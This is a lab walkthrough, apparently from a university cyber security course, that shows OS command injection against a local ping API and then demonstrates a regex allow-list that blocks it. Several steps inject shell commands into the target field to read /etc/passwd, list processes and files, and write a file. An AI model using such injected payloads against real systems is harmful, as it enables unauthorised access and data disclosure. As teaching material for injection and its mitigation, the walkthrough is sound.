# OS Command Injection — Hands-On Walkthrough

> Run every command yourself, in order. Two terminals needed — one for the server, one for the commands.

The outputs below are examples; usernames, system details, and timings depend on your local environment. See the [project README](README.md) for prerequisites.

---

## Terminal 1 — Start the Server

```bash
cd os-command-injection-variant_1
bash run.sh
```

You should see:
```
======================================================================
  IIITA Cyber Security Lab (IT-30001) - OS Command Injection
  Server starting on http://127.0.0.1:5000
======================================================================
 * Running on http://127.0.0.1:5000
```

**Leave this running. Open a second terminal for everything below.**

---

## Terminal 2 — All Commands Below

---

### Step 1: Normal Ping (Benign — No Injection)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "mode": "vulnerable"}' | python3 -m json.tool
```

**What you see:**
```json
{
    "status": "success",
    "mode": "vulnerable",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ...\n64 bytes from 127.0.0.1: icmp_seq=2 ...\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss ...\n",
    "returncode": 0
}
```

**What it means:** The server ran `ping -c 2 127.0.0.1` and returned the output. This is normal, expected behaviour. No attack yet.

---

### Step 2: Inject `whoami` (Find Out Who the Server Runs As)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; whoami", "mode": "vulnerable"}' | python3 -m json.tool
```

**What you see:** Look at `executed_command` and the end of `output`:
```json
{
    "executed_command": "ping -c 2 127.0.0.1; whoami",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received ...\nvarun\n"
}
```

**What it means:** The semicolon (`;`) told the shell "run the next command too." The server executed `whoami` after `ping` and returned the username `varun` in the response. **This is the injection — we just ran an arbitrary OS command.**

---

### Step 3: Inject `id` and `uname -a` (Full System Recon)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; id; uname -a", "mode": "vulnerable"}' | python3 -m json.tool
```

**What you see** (at the end of `output`):
```
uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
Linux archlinux 6.12.1-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```

**What it means:** We now know the user ID, every group the server user belongs to, the exact Linux kernel version, and the CPU architecture. An attacker uses this for privilege escalation planning.

---

### Step 4: Read a Sensitive File (`/etc/passwd`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; cat /etc/passwd | head -5", "mode": "vulnerable"}' | python3 -m json.tool
```

**What you see** (at the end of `output`):
```
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
```

**What it means:** The attacker just read the system's user account database. On a production server this is a severe information disclosure.

---

### Step 5: List Running Processes (`ps aux`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1 && ps aux | head -6", "mode": "vulnerable"}' | python3 -m json.tool
```

**What it means:** The attacker can see every running process — databases, other web apps, cron jobs — to find further attack targets. Notice `&&` also works as a command separator, not just `;`.

---

### Step 6: List Files in the Current Directory (`ls -la`)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; ls -la", "mode": "vulnerable"}' | python3 -m json.tool
```

**What it means:** The attacker can browse the server's filesystem — find config files, database credentials, source code, SSH keys, etc.

---

### Step 7: Prove Arbitrary Write Access (`echo` to a file)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; echo HACKED > /tmp/pwned.txt; cat /tmp/pwned.txt", "mode": "vulnerable"}' | python3 -m json.tool
```

**What you see** (at the end of `output`):
```
HACKED
```

Verify the file was actually created:
```bash
cat /tmp/pwned.txt
```
```
HACKED
```

**What it means:** The attacker can write arbitrary files. They could deface a website, plant a backdoor, or overwrite configuration.

Clean up:
```bash
rm /tmp/pwned.txt
```

---

## Now Switch to the Mitigated Endpoint

The exact same payloads, but with `"mode": "mitigated"`.

---

### Step 8: Same `whoami` Exploit — Now Blocked

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; whoami", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:**
```json
{
    "status": "blocked",
    "mode": "mitigated",
    "executed_command": null,
    "message": "SECURITY ALERT: Request blocked by allow-list filter. Shell metacharacters or invalid hostnames are strictly prohibited.",
    "output": "[SECURITY_FILTER_TRIGGERED] Input '127.0.0.1; whoami' rejected by allow-list pattern r'^[a-zA-Z0-9.-]+$'."
}
```

**What it means:** The regex `^[a-zA-Z0-9.-]+$` detected the `;` and space — characters not allowed in a hostname. The request was rejected with HTTP 400. **No command was executed at all.**

---

### Step 9: Same Full Recon Exploit — Blocked

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; id; uname -a", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:** Same `"status": "blocked"` response. Zero output from any injected command.

---

### Step 10: Same `/etc/passwd` Exploit — Blocked

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; cat /etc/passwd | head -5", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:** `"status": "blocked"`. No file contents leaked.

---

### Step 11: Same File Write Exploit — Blocked

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1; echo HACKED > /tmp/pwned.txt", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:** `"status": "blocked"`. Verify no file was created:
```bash
cat /tmp/pwned.txt 2>&1
```
```
cat: /tmp/pwned.txt: No such file or directory
```

---

### Step 12: Legitimate Request Still Works in Mitigated Mode

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:**
```json
{
    "status": "success",
    "mode": "mitigated",
    "executed_command": "ping -c 2 127.0.0.1",
    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...",
    "returncode": 0
}
```

**What it means:** The mitigation only blocks malicious input. Normal hostnames and IPs work perfectly. The application is still functional.

---

### Step 13: Test with a Domain Name (Mitigated Mode)

```bash
curl -s -X POST http://127.0.0.1:5000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target": "google.com", "mode": "mitigated"}' | python3 -m json.tool
```

**What you see:** Normal ping output for `google.com` (or a DNS resolution error if offline). The point is: the regex allows valid FQDNs like `google.com` and `my-server.example.org`.

---

## Summary Table

| Step | Payload | Mode | Result |
|:-----|:--------|:-----|:-------|
| 1 | `127.0.0.1` | vulnerable | ✅ Normal ping output |
| 2 | `127.0.0.1; whoami` | vulnerable | ⚠️ **INJECTED** — returns username |
| 3 | `127.0.0.1; id; uname -a` | vulnerable | ⚠️ **INJECTED** — returns uid, groups, kernel |
| 4 | `127.0.0.1; cat /etc/passwd \| head -5` | vulnerable | ⚠️ **INJECTED** — dumps system users |
| 5 | `127.0.0.1 && ps aux \| head -6` | vulnerable | ⚠️ **INJECTED** — lists processes |
| 6 | `127.0.0.1; ls -la` | vulnerable | ⚠️ **INJECTED** — lists server files |
| 7 | `127.0.0.1; echo HACKED > /tmp/pwned.txt` | vulnerable | ⚠️ **INJECTED** — writes a file to disk |
| 8 | `127.0.0.1; whoami` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
| 9 | `127.0.0.1; id; uname -a` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
| 10 | `127.0.0.1; cat /etc/passwd \| head -5` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
| 11 | `127.0.0.1; echo HACKED > /tmp/pwned.txt` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
| 12 | `127.0.0.1` | mitigated | ✅ Normal ping — still works |
| 13 | `google.com` | mitigated | ✅ Normal ping — still works |

---

## Stop the Server

Go back to Terminal 1 and press `Ctrl+C`.
